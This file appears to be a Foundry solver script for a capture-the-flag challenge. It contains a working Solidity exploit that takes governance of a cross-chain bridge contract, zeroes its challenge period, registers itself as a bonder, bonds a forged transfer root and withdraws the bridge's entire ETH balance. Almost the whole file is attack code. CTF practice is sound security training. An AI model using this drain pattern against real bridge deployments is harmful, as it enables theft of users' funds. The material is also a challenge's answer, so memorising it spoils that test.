// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";

interface IBridge {
    function withdraw(
        address recipient,
        uint256 amount,
        bytes32 transferNonce,
        uint256 bonderFee,
        uint256 amountOutMin,
        uint256 deadline,
        bytes32 rootHash,
        uint256 transferRootTotalAmount,
        uint256 transferIdTreeIndex,
        bytes32[] calldata siblings,
        uint256 totalLeaves
    ) external;

    function bondTransferRoot(bytes32 rootHash, uint256 destinationChainId, uint256 totalAmount) external;

    function setChallengePeriod(uint256) external;

    function addBonder(address bonder) external;

    function setChallengeResolutionPeriod(uint256) external;

    function getTransferId(
        uint256 chainId,
        address recipient,
        uint256 amount,
        bytes32 transferNonce,
        uint256 bonderFee,
        uint256 amountOutMin,
        uint256 deadline
    ) external pure returns (bytes32);

    function setGovernance(address) external;
}

contract Exploit {
    Challenge private immutable CHALLENGE;

    IBridge private immutable BRIDGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;

        BRIDGE = IBridge(CHALLENGE.BRIDGE());
    }

    function exploit() external {
        console.log("solved?", CHALLENGE.isSolved());

        BRIDGE.setChallengePeriod(0);
        BRIDGE.addBonder(address(this));

        uint256 balance = address(BRIDGE).balance;

        bytes32 transferId = BRIDGE.getTransferId(1, address(this), balance, bytes32(0x00), 0, 0, 0);
        BRIDGE.bondTransferRoot(transferId, 1, balance);
        BRIDGE.withdraw(address(this), balance, bytes32(0x00), 0, 0, 0, transferId, balance, 0, new bytes32[](0), 1);

        console.log("solved?", CHALLENGE.isSolved());
    }

    receive() external payable {}
}

contract Solve is CTFSolver {
    function solve(address challenge, address) internal override {
        Exploit exploit = new Exploit(Challenge(challenge));

        IBridge(Challenge(challenge).BRIDGE()).setGovernance(address(exploit));

        exploit.exploit();
    }
}
